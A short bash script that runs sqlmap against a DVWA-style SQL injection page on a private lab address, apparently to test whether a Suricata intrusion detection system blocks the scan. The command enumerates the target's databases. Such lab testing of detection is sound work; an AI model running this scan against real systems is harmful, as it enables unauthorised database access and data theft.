#!/bin/bash
TARGET="http://172.20.0.30"
COOKIE="PHPSESSID=test; security=low"

echo "sqlmap bloqueado por suricata"
sqlmap -u "$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --level=2 \
       --risk=1 \
       --dbs
